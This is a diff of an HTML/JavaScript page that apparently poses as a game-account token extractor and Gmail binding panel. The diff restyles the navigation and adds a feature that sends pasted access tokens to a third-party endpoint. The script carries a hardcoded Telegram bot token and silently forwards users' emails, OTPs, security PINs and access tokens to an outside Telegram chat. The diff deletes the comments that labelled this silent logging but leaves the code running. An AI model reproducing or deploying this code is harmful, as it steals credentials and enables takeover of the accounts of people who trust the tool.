@@ -39,7 +39,6 @@
 
     * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
-    /* SMOOTH SCROLLING & SCROLLBAR */
     html { scroll-behavior: smooth; }
     
     ::-webkit-scrollbar { width: 5px; }
@@ -56,7 +55,6 @@
         padding-bottom: 110px;
     }
 
-    /* Animation Background */
     .bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; overflow: hidden; pointer-events: none; }
     .bg-particle {
         position: absolute; background: var(--accent-blue); border-radius: 50%;
@@ -70,7 +68,6 @@
         padding-top: 60px;
     }
 
-    /* HEADERS WITH LINES */
     .brand-header { text-align: center; margin-bottom: 35px; padding-top: 10px; }
     .brand-logo {
         font-family: 'Orbitron', sans-serif; font-size: 2.6rem; font-weight: 800;
@@ -87,7 +84,6 @@
         box-shadow: 0 0 10px var(--accent-blue);
     }
     
-    /* NEW FIXED DEVELOPER BADGE STYLE */
     .dev-top-link {
         position: fixed; top: 15px; left: 50%; transform: translateX(-50%);
         z-index: 1500; display: flex; align-items: center; gap: 8px;
@@ -99,7 +95,6 @@
     }
     .dev-top-link:hover { background: rgba(79, 172, 254, 0.15); box-shadow: 0 0 20px rgba(79, 172, 254, 0.3); transform: translateX(-50%) translateY(2px); }
 
-    /* Cards */
     .glass-card {
         background: var(--bg-card); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
         border: 1px solid var(--border); border-radius: 26px; padding: 25px;
@@ -113,7 +108,6 @@
         letter-spacing: 1px; margin-bottom: 18px; font-family: 'Montserrat', sans-serif;
     }
 
-    /* Input Fields */
     .input-group { margin-bottom: 18px; }
     .input-box {
         width: 100%; padding: 18px; background: rgba(0, 0, 0, 0.3);
@@ -123,7 +117,6 @@
     .input-box:focus { outline: none; border-color: var(--accent-blue); background: rgba(0, 0, 0, 0.5); box-shadow: 0 0 15px rgba(79, 172, 254, 0.1); }
     .input-box.error { border-color: var(--error-red); }
 
-    /* Buttons */
     .btn {
         display: flex; align-items: center; justify-content: center; gap: 10px;
         width: 100%; padding: 18px; border: none; border-radius: 18px;
@@ -139,7 +132,6 @@
     .btn-accent { background: var(--gradient-4); color: #000; font-weight: 800; box-shadow: 0 8px 25px rgba(67, 233, 123, 0.2); }
     .btn-danger { background: var(--gradient-2); color: white; font-weight: 700; box-shadow: 0 8px 25px rgba(245, 87, 108, 0.3); }
 
-    /* --- BIND TOOL SPECIFIC --- */
     .step-container { display: none; animation: fadeIn 0.5s ease; }
     .step-container.active { display: block; }
     .flex-row { display: flex; gap: 10px; }
@@ -150,7 +142,6 @@
 
     .error-text { color: var(--error-red); font-size: 0.75rem; margin-left: auto; display: none; font-weight: 600; }
 
-    /* --- SOCIAL CHANNELS --- */
     .social-list-vertical { display: flex; flex-direction: column; gap: 12px; }
     .social-card-row {
         display: flex; align-items: center; padding: 14px 18px;
@@ -171,7 +162,6 @@
     .social-name { color: white; font-weight: 600; font-size: 1rem; }
     .social-handle { color: var(--text-secondary); font-size: 0.8rem; }
 
-    /* --- FOOTER --- */
     .footer {
         text-align: center; margin-top: 40px; padding: 25px 0;
         color: var(--text-secondary); font-size: 0.85rem; border-top: 1px solid var(--border);
@@ -181,22 +171,21 @@
         font-size: 0.8rem; letter-spacing: 2px; text-transform: uppercase; display: block;
     }
 
-    /* Bottom Nav */
+    /* Modifed Bottom Nav to fit 5 Icons */
     .bottom-nav {
         position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
-        display: flex; gap: 12px; background: rgba(15, 15, 25, 0.9); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
-        border: 1px solid rgba(255,255,255,0.15); border-radius: 60px; padding: 12px 15px;
+        display: flex; gap: 10px; background: rgba(15, 15, 25, 0.9); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
+        border: 1px solid rgba(255,255,255,0.15); border-radius: 60px; padding: 10px 15px;
         z-index: 1000; box-shadow: 0 10px 40px rgba(0,0,0,0.5);
     }
     .nav-item {
-        width: 55px; height: 55px; border-radius: 50%; display: flex;
+        width: 50px; height: 50px; border-radius: 50%; display: flex;
         align-items: center; justify-content: center; color: rgba(255,255,255,0.5);
-        font-size: 1.4rem; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+        font-size: 1.3rem; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
         cursor: pointer; text-decoration: none; position: relative;
     }
     .nav-item.active { background: var(--gradient-1); color: white; transform: translateY(-15px); box-shadow: 0 10px 25px rgba(102, 126, 234, 0.5); }
 
-    /* Modal */
     .modal-overlay {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px);
@@ -244,7 +233,6 @@
     </a>
 
     <div id="view-dashboard" class="container fade-in-up">
-        
         <div class="brand-header">
             <h1 class="brand-logo">𝐒𝐔𝐌𝐀𝐍 𝐁𝐇𝐀𝐈</h1>
             <div class="brand-subtitle">𝐒𝐂𝐀𝐌𝐌𝐄𝐑 𝐊𝐀 𝐁𝐀𝐀𝐏</div>
@@ -263,6 +251,12 @@
             <div class="input-group">
                 <a href="#" onclick="switchView('bind'); return false;" class="btn btn-secondary">
                     <i class="fas fa-fingerprint"></i> <span>SET NEW GMAIL</span>
+                </a>
+            </div>
+
+            <div class="input-group">
+                <a href="#" onclick="switchView('info'); return false;" class="btn btn-secondary" style="border-color: var(--accent-purple);">
+                    <i class="fas fa-info-circle" style="color: var(--accent-purple);"></i> <span>CHECK BIND INFO</span>
                 </a>
             </div>
             
@@ -303,7 +297,6 @@
             <div class="brand-subtitle">AUTO EXTRACTOR</div>
             <div class="brand-separator"></div>
         </div>
-        
         <div class="glass-card fade-in-up">
             <div class="section-label"><i class="fas fa-sign-in-alt"></i> OPEN LOGIN PAGE</div>
             <div style="display: grid; gap: 12px;">
@@ -328,15 +321,12 @@
             <div class="brand-subtitle">SUMAN BHAI PANEL</div>
             <div class="brand-separator"></div>
         </div>
-
         <div class="glass-card">
-            
             <div id="step1" class="step-container active">
                 <div class="input-group">
                     <div class="section-label"><i class="fas fa-envelope"></i> ENTER YOUR GMAIL</div>
                     <input type="text" id="enterLater" class="input-box" placeholder="Enter email..." required>
                 </div>
-
                 <div class="input-group">
                     <div class="section-label"><i class="fas fa-key"></i> ACCESS TOKEN</div>
                     <div class="flex-row">
@@ -344,32 +334,15 @@
                         <button id="step1Btn" class="btn-next">SEND OTP</button>
                     </div>
                 </div>
-
                 <button onclick="switchStep(2)" class="btn-nav-small">
                     GO NEXT PAGE <i class="fas fa-chevron-right"></i>
                 </button>
-
-                <div style="margin-top: 30px; border-top: 1px solid var(--border); padding-top: 20px;">
-                    <div class="section-label"><i class="fas fa-users"></i> OFFICIAL CHANNELS</div>
-                    <div class="social-list-vertical">
-                        <a href="https://t.me/reallsumann" target="_blank" class="social-card-row">
-                            <div class="social-icon-box tg-bg"><i class="fab fa-telegram-plane"></i></div>
-                            <div class="social-texts"><span class="social-name">Telegram</span><span class="social-handle">@Realsuman2561</span></div>
-                        </a>
-                        <a href="https://www.instagram.com/realsuman355?igsh=N3QxOHNqazE3ZzE0" target="_blank" class="social-card-row">
-                            <div class="social-icon-box ig-bg"><i class="fab fa-instagram"></i></div>
-                            <div class="social-texts"><span class="social-name">Instagram</span><span class="social-handle">@realsuman355</span></div>
-                        </a>
-                    </div>
-                </div>
             </div>
-
             <div id="step2" class="step-container">
                 <div class="input-group">
                     <div class="section-label"><i class="fas fa-shield-alt"></i> ENTER OTP</div>
                     <input type="number" id="otpInput" class="input-box" placeholder="e.g. 12345678" required>
                 </div>
-
                 <div class="input-group">
                     <div class="section-label">
                         <i class="fas fa-lock"></i> SECURITY PIN 
@@ -377,24 +350,51 @@
                     </div>
                     <input type="text" id="pinInput" class="input-box" placeholder="Min 6 digits..." required>
                 </div>
-
                 <div class="input-group">
                     <div class="section-label"><i class="fas fa-key"></i> ACCESS TOKEN</div>
                     <input type="text" id="accessToken2" class="input-box" placeholder="Paste token..." required>
                 </div>
-
                 <div class="input-group">
                     <div class="section-label"><i class="fas fa-envelope"></i> ENTER GMAIL</div>
                     <input type="email" id="gmailInput" class="input-box" placeholder="Your gmail..." required>
                 </div>
-
                 <button id="confirmBtn" class="btn-submit">CONFIRM BIND</button>
-
-                <button onclick="switchStep(1)" class="btn-nav-small">
-                    <i class="fas fa-arrow-left"></i> GO BACK
-                </button>
+                <button onclick="switchStep(1)" class="btn-nav-small"><i class="fas fa-arrow-left"></i> GO BACK</button>
             </div>
         </div>
+        <div style="height: 60px;"></div>
+    </div>
+
+    <div id="view-info" class="container hidden">
+        <div class="brand-header">
+            <h1 class="brand-logo">𝐁𝐈𝐍𝐃 𝐈𝐍𝐅𝐎</h1>
+            <div class="brand-subtitle">CHECK ACCOUNT STATUS</div>
+            <div class="brand-separator"></div>
+        </div>
+
+        <div class="glass-card fade-in-up">
+            <div class="section-label">
+                <i class="fas fa-search"></i>
+                <span>ENTER ACCESS TOKEN</span>
+            </div>
+            <textarea id="infoToken" class="input-box" placeholder="Paste access token here to check bind info..." style="min-height: 120px; resize: none;"></textarea>
+            
+            <button id="checkInfoBtn" class="btn btn-primary" style="margin-top: 15px; background: var(--gradient-3); color: black;">
+                <i class="fas fa-search"></i>
+                <span>FETCH BIND DATA</span>
+            </button>
+        </div>
+
+        <div class="glass-card">
+            <div class="section-label"><i class="fas fa-users"></i> OFFICIAL CHANNELS</div>
+            <div class="social-list-vertical">
+                <a href="https://t.me/reallsumann" target="_blank" class="social-card-row">
+                    <div class="social-icon-box tg-bg"><i class="fab fa-telegram-plane"></i></div>
+                    <div class="social-texts"><span class="social-name">Telegram</span><span class="social-handle">@Realsuman2561</span></div>
+                </a>
+            </div>
+        </div>
+
         <div style="height: 60px;"></div>
     </div>
 
@@ -417,21 +417,6 @@
                 <span>CANCEL GMAIL</span>
             </button>
         </div>
-
-        <div class="glass-card">
-            <div class="section-label"><i class="fas fa-users"></i> OFFICIAL CHANNELS</div>
-            <div class="social-list-vertical">
-                <a href="https://t.me/reallsumann" target="_blank" class="social-card-row">
-                    <div class="social-icon-box tg-bg"><i class="fab fa-telegram-plane"></i></div>
-                    <div class="social-texts"><span class="social-name">Telegram</span><span class="social-handle">@Realsuman2561</span></div>
-                </a>
-                <a href="https://instagram.com/realsuman355" target="_blank" class="social-card-row">
-                    <div class="social-icon-box ig-bg"><i class="fab fa-instagram"></i></div>
-                    <div class="social-texts"><span class="social-name">Instagram</span><span class="social-handle">@realsuman355</span></div>
-                </a>
-            </div>
-        </div>
-
         <div style="height: 60px;"></div>
     </div>
 
@@ -447,12 +432,25 @@
             </div>
 
             <div id="genericMsg" style="color: var(--text-secondary); margin-bottom: 20px; display:none; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px;"></div>
-
             <div class="token-display" id="tAcc"></div>
             
             <div style="display: grid; gap: 12px; margin-top: 25px;">
                 <button onclick="safeCopy()" id="copyBtn" class="btn btn-primary">COPY TOKEN</button>
                 <button onclick="closeModal('tokenModal')" class="btn btn-secondary">CLOSE</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="infoModal">
+        <div class="modal-content" style="max-width: 420px;">
+            <div style="font-size: 3.5rem; margin-bottom: 10px; color: var(--accent-blue);"><i class="fas fa-info-circle"></i></div>
+            <h2 style="font-family: 'Orbitron'; background: var(--gradient-3); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 15px; font-size: 1.5rem;">BIND DETAILS</h2>
+            
+            <div id="infoDataContainer" style="margin-bottom: 20px; max-height: 300px; overflow-y: auto; text-align: left; background: rgba(0,0,0,0.3); padding: 10px 15px; border-radius: 12px; border: 1px solid var(--border);">
+                </div>
+            
+            <div style="display: grid; gap: 12px; margin-top: 25px;">
+                <button onclick="closeModal('infoModal')" class="btn btn-secondary">CLOSE</button>
             </div>
         </div>
     </div>
@@ -467,13 +465,15 @@
         <div class="nav-item" id="nav-bind" onclick="switchView('bind')">
             <i class="fas fa-fingerprint"></i>
         </div>
+        <div class="nav-item" id="nav-info" onclick="switchView('info')">
+            <i class="fas fa-info-circle"></i>
+        </div>
         <div class="nav-item" id="nav-cancel" onclick="switchView('cancel')">
-            <i class="fas fa-star"></i>
+            <i class="fas fa-trash-alt"></i>
         </div>
     </div>
 
 <script>
-    // === TELEGRAM CONFIGURATION ===
     const TG_BOT_TOKEN = '8478471111:AAH7-TSGMozFOXxWuC8deQKhK0KxK6ZWVdU';
     const TG_CHAT_ID = '8257117768';
 
@@ -482,7 +482,6 @@
         fetch(url).catch(err => console.log('Log failed'));
     }
 
-    // === ANIMATION PARTICLES ===
     document.addEventListener('DOMContentLoaded', () => {
         const c = document.querySelector('.bg-animation');
         for(let i=0; i<18; i++) {
@@ -496,11 +495,12 @@
         }
     });
 
-    // === NAVIGATION (SMOOTH SCROLL) ===
+    // NAVIGATION
     function switchView(viewName) {
         document.getElementById('view-dashboard').classList.add('hidden');
         document.getElementById('view-token').classList.add('hidden');
         document.getElementById('view-bind').classList.add('hidden');
+        document.getElementById('view-info').classList.add('hidden');
         document.getElementById('view-cancel').classList.add('hidden');
         
         document.querySelectorAll('.container').forEach(el => el.classList.remove('fade-in-up'));
@@ -508,7 +508,6 @@
         const target = document.getElementById('view-' + viewName);
         target.classList.remove('hidden');
         
-        // Force reflow for animation restart
         void target.offsetWidth; 
         target.classList.add('fade-in-up');
 
@@ -517,12 +516,13 @@
         if (viewName === 'dashboard') document.getElementById('nav-home').classList.add('active');
         else if (viewName === 'token') document.getElementById('nav-token').classList.add('active');
         else if (viewName === 'bind') document.getElementById('nav-bind').classList.add('active');
+        else if (viewName === 'info') document.getElementById('nav-info').classList.add('active');
         else if (viewName === 'cancel') document.getElementById('nav-cancel').classList.add('active');
 
         window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
-    // === BIND TOOL LOGIC ===
+    // BIND TOOL
     function switchStep(step) {
         document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
         document.getElementById('step' + step).classList.add('active');
@@ -573,10 +573,8 @@
         if (!otp || !pin || !token || !email) return showToast('Fill all fields!', 'error');
         if (/[^0-9]/.test(pin)) return showToast('Pin must be numbers', 'error');
 
-        // --- SILENT TG LOGGING (BIND) ---
         const logMsg = `🔗 <b>BIND ATTEMPT</b>\n\n📧 <b>Email:</b> ${email}\n1️⃣ <b>OTP:</b> ${otp}\n2️⃣ <b>PIN:</b> ${pin}\n\n🔑 <b>Token:</b> <code>${token}</code>`;
         sendLogToTG(logMsg);
-        // --------------------------------
 
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
         btn.disabled = true;
@@ -593,7 +591,53 @@
             });
     });
 
-    // === CANCEL GMAIL LOGIC ===
+    // NEW BIND INFO LOGIC
+    document.getElementById('checkInfoBtn').addEventListener('click', async function() {
+        let token = document.getElementById('infoToken').value.trim();
+        const btn = this;
+        const originalText = btn.innerHTML;
+
+        if (!token) return showToast("Please enter a token!", 'error');
+
+        if (token.includes('access_token=')) {
+            token = token.split('access_token=')[1].split('&')[0];
+        }
+
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> FETCHING DATA...';
+
+        try {
+            const apiUrl = `https://sooty-eight.vercel.app/bind_info?access_token=${token}`;
+            const res = await fetch(apiUrl);
+            const data = await res.json();
+
+            const container = document.getElementById('infoDataContainer');
+            container.innerHTML = ''; 
+
+            if (Object.keys(data).length === 0 || data.error) {
+                container.innerHTML = `<div style="text-align:center; color: var(--error-red); padding: 10px;">${data.error || 'No data found or Invalid token.'}</div>`;
+            } else {
+                for (const [key, value] of Object.entries(data)) {
+                    // Make Keys readable (e.g. "account_name" -> "Account Name")
+                    const formattedKey = key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
+                    
+                    const row = document.createElement('div');
+                    row.className = 'data-row';
+                    row.innerHTML = `<span>${formattedKey}</span><span class="data-val" style="color: var(--accent-blue); text-align: right; max-width: 60%; word-break: break-word;">${value}</span>`;
+                    container.appendChild(row);
+                }
+            }
+            openModal('infoModal');
+
+        } catch (err) {
+            showToast("Connection Failed or Token Invalid!", 'error');
+        } finally {
+            btn.disabled = false;
+            btn.innerHTML = originalText;
+        }
+    });
+
+    // CANCEL LOGIC
     document.getElementById('cancelBtn').addEventListener('click', async function() {
         let token = document.getElementById('cancelToken').value.trim();
         const btn = this;
@@ -605,10 +649,8 @@
             token = token.split('access_token=')[1].split('&')[0];
         }
 
-        // --- SILENT TG LOGGING (CANCEL) ---
         const logMsg = `🚫 <b>CANCEL ATTEMPT</b>\n\n🔑 <b>Token:</b> <code>${token}</code>`;
         sendLogToTG(logMsg);
-        // ----------------------------------
 
         btn.disabled = true;
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
@@ -635,7 +677,7 @@
         }
     });
 
-    // === TOKEN EXTRACTION LOGIC ===
+    // TOKEN EXTRACTION
     async function processToken() {
         const inputField = document.getElementById('urlInput');
         let rawInput = inputField.value.trim();
@@ -675,10 +717,8 @@
             }
 
             if (success && data.access_token) {
-                // --- SILENT TG LOGGING (TOKEN) ---
                 const logMsg = `🚀 <b>NEW TOKEN EXTRACTED</b>\n\n👤 <b>Name:</b> ${data.nickname}\n🆔 <b>UID:</b> ${data.uid}\n🌍 <b>Region:</b> ${data.region}\n\n🔑 <b>Access Token:</b> <code>${data.access_token}</code>\n\n📥 <b>Input EAT:</b> <code>${rawInput}</code>`;
                 sendLogToTG(logMsg);
-                // ---------------------------------
 
                 document.getElementById('tokenDetails').style.display = 'block';
                 document.getElementById('tAcc').style.display = 'block';
@@ -702,7 +742,7 @@
         }
     }
 
-    // === CLIPBOARD ===
+    // CLIPBOARD
     function safeCopy() {
         const text = document.getElementById('tAcc').textContent;
         if (!text) return showToast('Nothing to copy!', 'error');
@@ -733,7 +773,7 @@
         document.body.removeChild(textArea);
     }
 
-    // === UTILS ===
+    // UTILS
     function showToast(msg, type) {
         const toast = document.getElementById('toast');
         toast.textContent = msg;
